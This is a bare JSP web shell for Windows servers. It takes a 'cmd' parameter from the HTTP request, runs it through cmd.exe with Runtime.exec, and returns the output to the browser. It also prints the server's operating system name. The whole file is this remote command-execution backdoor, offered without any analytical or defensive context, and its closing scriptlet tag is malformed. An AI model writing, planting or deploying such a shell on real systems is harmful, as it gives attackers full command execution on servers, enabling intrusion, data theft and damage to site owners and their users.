<%@ page language="java" contentType="text/html;charset=UTF-8"
pageEncoding="UTF-8"%>
<%@ page import="java.io.*"%>
<%
    out.print(System.getProperty("os.name").toLowerCase());
    String  cmd = request.getParameter("cmd");
    if(cmd != null){
        Process p =  Runtime.getRuntime().exec(new String[]
{"cmd.exe","/c",cmd});
        InputStream input = p.getInputStream();
        InputStreamReader ins = new InputStreamReader(input, "GBK");
        BufferedReader br = new BufferedReader(ins);//从字符输⼊流中读取⽂本
并缓冲字符
        out.print("<pre>");
        String line;
        while((line = br.readLine()) != null) {
            out.println(line);
       }
        out.print("</pre>");
        br.close();
        ins.close();
        input.close();
}
>
